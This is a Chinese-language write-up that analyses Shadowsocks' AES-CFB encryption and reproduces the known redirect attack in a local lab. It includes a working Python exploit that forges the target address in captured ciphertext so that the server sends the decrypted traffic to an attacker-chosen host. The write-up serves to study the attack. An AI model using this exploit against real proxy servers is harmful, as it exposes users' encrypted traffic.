        self.key = key
        iv = iv[:m[METHOD_INFO_IV_LEN]]
        if op == CIPHER_ENC_ENCRYPTION:
            # this iv is for cipher not decipher
            self.cipher_iv = iv
        return m[METHOD_INFO_CRYPTO](method, key, iv, op, self.crypto_path)
可以看到最终也是使用`EVP_BytesToKey`来生成`key`
所以无论`tcp`还是`udp`的加密本质上是一样的, 只是中间调用的方式不同
进入`EVP_BytesToKey`查看
    def EVP_BytesToKey(password, key_len, iv_len):
        # equivalent to OpenSSL's EVP_BytesToKey() with count 1
        # so that we make the same key and iv as nodejs version
        cached_key = '%s-%d-%d' % (password, key_len, iv_len)
        r = cached_keys.get(cached_key, None)
        if r:
            return r
        m = []
        i = 0
        while len(b''.join(m))  0:
                data = m[i - 1] + password
            md5.update(data)
            m.append(md5.digest())
            i += 1
        ms = b''.join(m)
        key = ms[:key_len]
        iv = ms[key_len:key_len + iv_len]
        cached_keys[cached_key] = (key, iv)
        return key, iv
其实就是用`passwd`作为种子, 根据`key`的长度来不断哈希来生成真正的`key`
加密完成后发送给服务端
### 收包
和发包相似, 流程大致如下
    解密 --> 解析(ip, port等) --> dns查询 --> 创建socket --> ip过滤 --> 修改数据格式 --> 转发
由于`tcp`和`udp`都是一样的, 这里用`udp`来简化研究, 在`117行`, 找到其中主要关注解密部分
    data, key, iv = cryptor.decrypt_all(self._password,
                                        self._method,
                                        data, self._crypto_path)
    def decrypt_all(password, method, data, crypto_path=None):
        result = []
        method = method.lower()
        (key, iv, m) = gen_key_iv(password, method)
        iv = data[:len(iv)]
        data = data[len(iv):]
        cipher = m(method, key, iv, CIPHER_ENC_DECRYPTION, crypto_path)
        result.append(cipher.decrypt_once(data))
        return b''.join(result), key, iv
首先根据`password`, 用`gen_key_iv`生成`key`, 和客户端一致
然后`decrypt_all`将`iv`和`data`分离出来(根据`len(iv)`), 然后把data拿去解密
##### 总结
纵观整个流程, 其实通讯设计是比较简单的, 没用常见的`校验`、`签名`等操作
数据结构:`rand_iv + AES-cfb(key, rand_iv, data)`
甚至连`iv`都是直接在数据开头, 全靠用`password`生成的`key`来保证安全
## aes-cfb
### 基本原理
可参考[wiki](https://zh.wikipedia.org/zh-cn/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F)
原理图如下:  
  * 与`aes-cbc`几乎相反 -- 首先进行aes加密, 然后与前一组异或
  * `cfb`模式加密解密过程一样, 因为最后一步是异或
实验
    #!/usr/bin/python
    from Crypto.Cipher import AES
    import os
    key = os.urandom(16)
    iv = os.urandom(16)
    pt = b'0'*16
    # 加密
    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
    tmp = cipher.encrypt(pt)
    print(tmp)
    # 解密
    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
    tmp = cipher.decrypt(pt)
    print(tmp)
    # b'B\x99\xcf\xde\x97F\x901\xd1\xf2\x02\xba\xaaT\xafI'
    # b'B\x99\xcf\xde\x97F\x901\xd1\xf2\x02\xba\xaaT\xafI'
### 伪造
由于最后一步是异或, 那么我们在已知明文、密文且拥有解密权限下的情况下就可以控制明文了
推导如下:
对于第一组密文, 首先对`iv`aes加密, 用作后面异或, 由于其值不变
可视为常量, 记作`K`, 密文记作`ct`, 明文记作`pt`, 需要伪造的明文为`pt'`, 伪造的密文为`ct'`
根据已知
    ct = pt xor K
那么在已知`pt`、`ct`的情况下, 可以求得`K`
    K = ct xor pt
在已知`K`的情况下,
    ct' = pt' xor K
即可伪造
    #!/usr/bin/python
    from Crypto.Cipher import AES
    import os
    key = os.urandom(16)
    iv = os.urandom(16)
    def xor(a,b):
        return bytes(x^y for x,y in zip(a,b))
    pt = b'0'*16
    pt_ = b'1'*16
    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
    ct = cipher.encrypt(pt)
    K = xor(ct, pt)
    print("pt: ", pt)
    print("pt_: ",pt_)
    print("K : ", K)
    print("ct: ", ct)
    print("xor(K,pt): ", xor(K,pt))
    print("xor(K,ct): ", xor(K,ct))
    ct_ = xor(K,pt_)
    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
    pt_ = cipher.decrypt(ct_)
    print("pt_: ",pt_)
    '''
    pt:  b'0000000000000000'
    pt_:  b'1111111111111111'
    K :  b'\x9d\x04(\x07.u\xd8}\xff\xd9S\xb9*\x9e\x181'
    ct:  b'\xad4\x187\x1eE\xe8M\xcf\xe9c\x89\x1a\xae(\x01'
    xor(K,pt):  b'\xad4\x187\x1eE\xe8M\xcf\xe9c\x89\x1a\xae(\x01'
    xor(K,ct):  b'0000000000000000'
    pt_:  b'1111111111111111'
    '''
### 利用
利用条件有两个关键点
  * aes-cfb
  * 已知明文、密文
由于在`ss`默认的加密方式就是`aes-cfb`,已知密文是自然, 已知明文可以通过`ss`的`http`包来推测
因为所有的`http`包开头的数据都差不多, 前八个字节为`HTTP/1.1`
此[攻击方法](https://github.com/edwardz246003/shadowsocks)最早由奇虎360一位安全研究员提出
## 复现
### config文件
编辑config文件在`shadowsocks`根目录下, 这里我选择local为20001端口, server为20002端口
    {
        "server":"127.0.0.1",
        "local_port":20001,
        "server_port":20002,
        "password":"happi0",
        "timeout":60,
        "method":"aes-256-cfb",
        "local_address":"127.0.0.1",
        "fast_open":false
    }
在`/srv/http`编辑`index.php`文件,内容如下
### 本地、代理、服务端搭建
    python server.py
    python local.py
    php -S 0.0.0.0:8008
测试代理是否正常
    netstat -antup|grep LIS|grep "2000[12]"
    tcp        0      0 127.0.0.1:20001         0.0.0.0:*               LISTEN      90020/python
    tcp        0      0 127.0.0.1:20002         0.0.0.0:*               LISTEN      90021/python
测试http服务是否正常
用浏览器访问`localhost:8080`即可
### 访问测试
    curl --socks5 127.0.0.1:20001 10.19.4.171:8080
    2021-09-13 03:46:43 INFO     connecting 10.19.4.171:8080 from 127.0.0.1:35202
    2021-09-13 03:46:43 INFO     connecting 10.19.4.171:8080 from 127.0.0.1:33480
    flag{cb9cd520a37a9c826841a8bcf3c20351}
由于127.0.0.1在代理的黑名单里,换成局域网地址即可
### 抓包分析
用`wireshark`监听即可
    tcp.port == 20001 || tcp.port == 20002
前两次`psh`包握手过程, 不赘述
查看第三次握手包的`data`部分
`0a1304ab 1f90`即`10.19.4.171 8080`
即接下来数据的目的地址
这里把`curl`的请求转发到`local`上
然后`local`将请求加密转发到`server`上
并且长度较为加密前增加了`171-148 == 23 == 16的iv + 7的ipv4转发`
最后`server`收到返回的数据后, 首先加密返回给`local`
`local`解密后返回最初的请求
且长度也是相差16的iv
## 利用
首先把密文给截取下来, 用上文描述的方法, 转发给`server`即可
这里[参考](https://blog.soreatu.com/posts/analyasis-of-shadowsocks-and-related-attack/#wireshark-packets)
    #!/usr/bin/python
    import socket
    import binascii
    from Crypto.Util.number import long_to_bytes as lb
    c = binascii.unhexlify("212aba32327c579d239a405770677e2ab1ca6f8288b9e59253917216b2034638c622293608b3a1dd843c71cf1fa704b95ee662c65fb14e1fca078643c6efb4f280a447d0493385dbbdf837f98e8b211749e1a738632b18fa2f1bb6a6ab83bb4c96035c611b79e1f36c2155493ddb8e4dc04c84297966959c4a4202c0bf51b1d0dbec1323b10bee1a4e3e3c58e3b8ee7796fdcaad638230fcf09f172e26271e2f0317481bde2cb1580f117a580908fb2ccac2d51a45a2976b56d41f6cca2227b17d76ddeb13390b8ddd3a7d92edada68a542b732c181ce43211e265")
    def xor(a, b):
        return bytes(x^y for x,y in zip(a,b))
    plain  = b"HTTP/1."
    target = b"\x01" + lb(10) + lb(19) + lb(4) + lb(171) + lb(7777)
    z = xor(plain, target)
    new_c  = c[:16] + xor(z, c[16:16+7]) + b"\x00"*(16-7) + c
    s = socket.socket()
    s.connect(("127.0.0.1", 20002))
    s.send(new_c)
效果如下  
### 参考资料
  * 
  * 
  * 
  * 
  * 